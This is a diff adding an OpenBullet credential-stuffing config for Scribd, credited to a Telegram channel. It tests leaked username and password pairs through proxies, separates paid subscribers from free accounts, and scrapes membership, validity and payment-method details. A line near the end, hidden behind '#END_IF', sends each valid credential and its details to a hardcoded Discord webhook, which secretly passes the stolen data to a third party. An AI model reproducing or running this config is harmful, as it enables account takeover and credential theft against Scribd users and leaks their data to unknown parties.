@@ -1,0 +1,115 @@
+[SETTINGS]
+{
+  "Name": "Scribd API [ TG- @OpenbulletConfigsOfficial ]",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T10:27:26.0347206-08:00",
+  "AdditionalInfo": "JOIN OUR TELEGRAM FOR MORE CONFIGS",
+  "Author": "[ TG- @OpenbulletConfigsOfficial ]",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.scribd.com/csrf_token" 
+  
+  HEADER "Host: www.scribd.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.scribd.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.scribd.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "TE: Trailers" 
+
+PARSE "<SOURCE>" JSON "csrf_token" -> VAR "csrf" 
+
+REQUEST POST "https://www.scribd.com/login" 
+  CONTENT "{\"login_or_email\":\"<USER>\",\"login_password\":\"<PASS>\",\"rememberme\":\"\",\"signup_location\":\"https://www.scribd.com/login\",\"login_params\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.scribd.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.scribd.com/login" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-CSRF-Token: <csrf>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.scribd.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "TE: Trailers" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "login\":true" 
+    KEY "success\":true" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid password. Please try again." 
+    KEY "No account found with that email or username. Please try again or sign up." 
+
+REQUEST GET "https://www.scribd.com/account-settings" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Scribd.user_data.is_subscriber = true;" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Scribd.user_data.is_subscriber = false;" 
+
+REQUEST GET "https://www.scribd.com/account-settings/payment-transactions" 
+  
+  HEADER "Host: www.scribd.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.scribd.com/" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Origin: https://www.scribd.com" 
+  HEADER "DNT: 1" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-GPC: 1" 
+  HEADER "TE: Trailers" 
+
+PARSE "<SOURCE>" LR "\"Membership (" ")\"," CreateEmpty=FALSE -> CAP "Membership" 
+
+PARSE "<SOURCE>" LR "Valid: " "\"}," CreateEmpty=FALSE -> CAP "Validity is From" 
+
+PARSE "<SOURCE>" JSON "payment_method" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+#END_IF REQUEST POST "https://discordapp.com/api/webhooks/777938059290345502/4oCJgg5MI2CXdOAyjv1l5wbljZt0Q95c5YcG1VEBRhR17MOjma5I0HshrAtjtndhw1ry" 
+  CONTENT "{\"content\":\"SCRIBD - <USER>:<PASS> /Membership-<Membership> /Validity is From-<Validity is From> /Payment Method-<Payment Method>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION Constant "[ TG- @OpenbulletConfigsOfficial ]" -> CAP "Config by" 
